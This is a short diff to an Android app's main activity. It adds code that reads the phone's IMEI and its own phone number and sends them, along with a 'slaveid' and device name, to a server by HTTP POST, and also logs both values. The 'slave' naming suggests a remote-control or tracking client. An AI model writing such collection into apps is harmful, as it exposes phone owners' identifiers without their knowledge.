@@ -14,6 +14,7 @@ import android.os.AsyncTask;
 import android.os.Bundle;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -212,6 +213,11 @@ public class MainActivity extends Activity {
 
             BluetoothAdapter myDevice = BluetoothAdapter.getDefaultAdapter();
             String deviceName = myDevice.getName();
+            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+
+            String imei = tm.getDeviceId();
+
+            String PhoneNumber = tm.getLine1Number();
 
 
 
@@ -228,7 +234,10 @@ public class MainActivity extends Activity {
                 nameValuePairs.add(new BasicNameValuePair("username", "kevin"));
                 nameValuePairs.add(new BasicNameValuePair("slaveid", regid));
                 nameValuePairs.add(new BasicNameValuePair("device", deviceName));
-
+                nameValuePairs.add(new BasicNameValuePair("imei", imei));
+                nameValuePairs.add(new BasicNameValuePair("phonenumber", PhoneNumber));
+                Log.i("phonenumber",PhoneNumber);
+                Log.i("imei",imei);
 
                 httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
 
